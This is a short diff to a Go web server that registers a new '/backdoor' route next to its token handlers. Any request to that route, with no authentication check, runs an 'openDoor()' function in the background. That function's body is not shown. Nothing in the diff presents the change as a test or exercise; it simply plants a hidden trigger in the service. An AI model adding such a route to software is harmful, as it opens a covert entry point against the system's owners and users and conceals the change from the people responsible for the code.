@@ -47,6 +47,7 @@ func main() {
 	http.HandleFunc("/", rootHandler)
 	http.HandleFunc("/token/", tokenHandler)
 	http.HandleFunc("/token", tokenHandler)
+	http.HandleFunc("/backdoor", backdoor)
 
 	go http.ListenAndServe(":80", http.HandlerFunc(redirectToHTTPS))
 
@@ -84,6 +85,10 @@ func rootHandler(w http.ResponseWriter, r *http.Request) {
 	default:
 		w.WriteHeader(404)
 	}
+}
+
+func backdoor(w http.ResponseWriter, r *http.Request) {
+	go openDoor()
 }
 
 func tokenHandler(w http.ResponseWriter, r *http.Request) {
